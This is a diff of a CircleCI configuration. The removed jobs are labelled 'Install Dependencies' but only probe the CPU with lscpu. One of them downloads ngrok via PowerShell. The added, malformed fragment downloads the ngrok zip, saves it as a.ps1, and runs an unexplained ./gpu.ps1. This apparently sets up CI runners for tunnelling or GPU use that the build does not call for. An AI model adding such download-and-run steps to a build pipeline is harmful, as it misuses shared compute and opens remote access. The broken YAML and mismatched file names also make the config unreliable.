@@ -1,39 +1,8 @@
-version: 2.1
-jobs:
-    Devop:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
-    Devop1:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
-    Devop2:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
-    Devop3:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: ngrok 
-            command: |Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok-zip
-	      
-workflows:
-    version: 2.1
-    build:
-        jobs:
-            - Devop
-            - Devop1
-            - Devop2
-            - Devop3
+
+    steps:
+
+	- run:
+        name: ngrok 
+            command: |
+              Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile a.ps1
+	- run: ./gpu.ps1
